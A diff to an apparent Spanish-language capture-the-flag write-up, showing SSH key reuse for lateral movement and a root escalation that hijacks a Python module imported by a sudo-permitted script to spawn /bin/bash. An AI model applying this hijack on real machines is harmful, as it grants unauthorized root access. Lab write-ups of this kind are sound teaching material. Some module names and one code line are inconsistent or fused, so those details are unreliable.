@@ -226,12 +226,41 @@ echo $AUTH_KEYS > ~/.ssh/authorized_keys
 echo $ID_RSA > ~/.ssh/id_rsa
 
 chmod 600 ~/.ssh/authorized_keys ~/.ssh/id_rsa
+chmod 600 ~/.ssh/id_rsa
 ```
 
 ### SOPHIE
 De aquí lo único que vamos a necesitar es el archivo `authorized_keys` presente en `/home/sophie/.ssh` para realizar un movimiento lateral hacia ol.
 
 ### OL
+Tenemos permiso de ejecución como `sudo` para un comando.
+
 ```
 sudo -l
+
+Matching Defaults entries for ol on hal9042:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User ol may run the following commands on hal9042:
+    (root) NOPASSWD: /opt/hal9042/scripts/report.py
 ```
+
+El script carga un módulo `modulai_utils` desde un directorio con permisos de escritura y ejecuta una función.
+
+```python
+sys.path.insert(0, "/opt/hal9042/lib")
+
+import moulai_utils   # noqa: E402  (provided by the lib/ directory)sys.path
+```
+
+Editamos con un `from os import system; system("/bin/bash")`.
+
+```bash
+ol@hal9042:~$ sudo  /opt/hal9042/scripts/report.py
+[report] HAL9042 nightly report
+root@hal9042:/home/ol# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Ya somos **root**.
